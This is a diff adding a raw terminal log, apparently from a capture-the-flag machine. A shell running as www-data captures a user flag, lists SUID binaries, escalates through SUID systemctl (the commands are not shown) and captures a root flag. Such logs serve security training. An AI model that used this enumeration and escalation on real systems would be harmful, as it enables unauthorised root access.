@@ -1,0 +1,48 @@
+Linux ip-10-65-154-154 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 09:27:10 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ [+] User:
+$ www-data
+[+] User flag:
+$ $ $ 8bd7992fbe8a6ad22a63361004cfcedb
+[+] SUID files:
+$ $ $ /usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl
+/bin/fusermount
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2582/usr/bin/chfn
+/snap/core20/2582/usr/bin/chsh
+/snap/core20/2582/usr/bin/gpasswd
+/snap/core20/2582/usr/bin/mount
+/snap/core20/2582/usr/bin/newgrp
+/snap/core20/2582/usr/bin/passwd
+/snap/core20/2582/usr/bin/su
+/snap/core20/2582/usr/bin/sudo
+/snap/core20/2582/usr/bin/umount
+/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2582/usr/lib/openssh/ssh-keysign
+/sbin/mount.cifs
+[+] Tentando privesc com systemctl...
+$ $ $ $ $ > > > > $ $ $ [+] Root flag:
+$ $ $ a58ff8579f0a9270368d33a9966c7fd5
+$ 
